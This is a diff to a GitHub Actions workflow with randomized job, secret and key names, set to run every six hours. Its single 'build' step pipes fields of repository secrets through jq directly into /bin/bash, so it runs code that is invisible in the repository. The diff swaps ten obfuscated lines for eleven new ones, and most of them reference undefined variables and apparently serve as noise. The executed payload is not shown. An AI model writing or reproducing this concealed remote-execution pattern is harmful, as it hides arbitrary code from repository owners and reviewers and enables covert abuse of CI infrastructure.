@@ -1,8 +1,10 @@
 name: jinxiusx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 3/6 * * *'
+    - cron: '28 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: jinxiusx
         env:
-          rsa98: ${{ secrets.rsa98 }}
+          m8052: ${{ secrets.m8052 }}
         run: |
-          echo $rsa98 | jq -r .aol9 | /bin/bash
-          echo $wdh4978 | jq -r .jo9848 | /bin/bash
-          echo $xi13210 | jq -r .uzwd47 | /bin/bash
-          echo $y536 | jq -r .ctk95 | /bin/bash
-          echo $a20 | jq -r .bgvp839 | /bin/bash
-          echo $mo7 | jq -r .gbk1051 | /bin/bash
-          echo $to56 | jq -r .yev608 | /bin/bash
-          echo $c6 | jq -r .jcc9 | /bin/bash
-          echo $hrjsv5 | jq -r .df890 | /bin/bash
-          echo $jmb0 | jq -r .g086 | /bin/bash
+          echo $m8052 | jq -r .sab4 | /bin/bash
+          echo $dqiak7014 | jq -r .uvp478 | /bin/bash
+          echo $lwpm6248 | jq -r .m447 | /bin/bash
+          echo $ffxzf6653 | jq -r .wefy6 | /bin/bash
+          echo $ry8 | jq -r .pxx8 | /bin/bash
+          echo $onqha838 | jq -r .vsiqr361 | /bin/bash
+          echo $dcil69135 | jq -r .ysehv774 | /bin/bash
+          echo $fgs69 | jq -r .p0 | /bin/bash
+          echo $sfc33 | jq -r .hfig1174 | /bin/bash
+          echo $lnfou101 | jq -r .vexjr4 | /bin/bash
+          echo $p3968 | jq -r .sqotn2 | /bin/bash
 
